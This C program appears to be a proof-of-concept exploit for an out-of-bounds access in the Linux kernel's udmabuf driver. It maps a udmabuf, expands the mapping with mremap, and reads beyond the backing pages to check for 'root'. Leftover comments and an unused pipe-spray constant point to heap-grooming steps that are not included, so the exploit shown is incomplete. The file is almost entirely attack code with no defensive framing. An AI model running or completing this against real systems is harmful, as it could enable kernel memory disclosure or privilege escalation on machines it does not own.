#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <sys/mman.h>

#include <err.h>

#include <unistd.h>
#include <fcntl.h>

#include <sys/ioctl.h>

#include <sys/uio.h>

#include <string.h>

#include <sys/types.h>
#include <sys/wait.h>

#define PAGE_SIZE 4096

#define N_PAGES_ALLOC 128

#define N_PIPES_SPRAY 256

struct udmabuf_create
{
  uint32_t memfd;
  uint32_t flags;
  uint64_t offset;
  uint64_t size;
};

#define UDMABUF_CREATE _IOW('u', 0x42, struct udmabuf_create)

void sigbus_handler(int sig) {
    printf("Caught SIGBUS signal\n");
    /* use _exit() in signal handlers instead of exit() */
    _exit(EXIT_SUCCESS);
}

int main(int argc, char* argv[argc+1])
{
  /* setup the signal handler */
  struct sigaction sa;
  sa.sa_handler = sigbus_handler;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = 0;

  if (sigaction(SIGBUS, &sa, NULL) == -1) {
    perror("sigaction");
    exit(EXIT_FAILURE);
  }

  int mem_fd = memfd_create("test", MFD_ALLOW_SEALING);
  if (mem_fd < 0)
    errx(1, "couldn't create anonymous file");
  
  /* setup size of anonymous file, the initial size was 0 */
  if (ftruncate(mem_fd, PAGE_SIZE * N_PAGES_ALLOC) < 0)
    errx(1, "couldn't truncate file length");

  /* make sure the file cannot be reduced in size */
  if (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) < 0)
    errx(1, "couldn't seal file");

  int dev_fd = open("/dev/udmabuf", O_RDWR);
  if (dev_fd < 0)
    errx(1, "couldn't open device");

  struct udmabuf_create create = { 0 };
  create.memfd = mem_fd;
  create.size  = PAGE_SIZE * N_PAGES_ALLOC;
  
  /* reallocate one of the freed holes in kmalloc-1024 */
  int udmabuf_fd = ioctl(dev_fd, UDMABUF_CREATE, &create);
  if (udmabuf_fd < 0)
    errx(1, "couldn't create udmabuf");

  /* map the udmabuf into userspace */
  void* udmabuf_map = mmap(NULL, PAGE_SIZE * N_PAGES_ALLOC,
      PROT_READ|PROT_WRITE, MAP_SHARED, udmabuf_fd, 0);
  if (udmabuf_map == MAP_FAILED)
    errx(1, "couldn't map udmabuf");

  /* remap the virtual mapping expanding its size */
  void* new_udmabuf_map = mremap(udmabuf_map,
      PAGE_SIZE * N_PAGES_ALLOC, PAGE_SIZE * N_PAGES_ALLOC * 2, MREMAP_MAYMOVE);
  if (new_udmabuf_map == MAP_FAILED)
    errx(1, "couldn't remap udmabuf mapping");

  /* we should be out-of-bounds of the pages array */
  char* ptr = new_udmabuf_map + PAGE_SIZE * N_PAGES_ALLOC;

  /* check if the oob succeded */
  if (! memcmp(ptr, "root", 4))
    exit(EXIT_SUCCESS);

  return EXIT_SUCCESS;
}
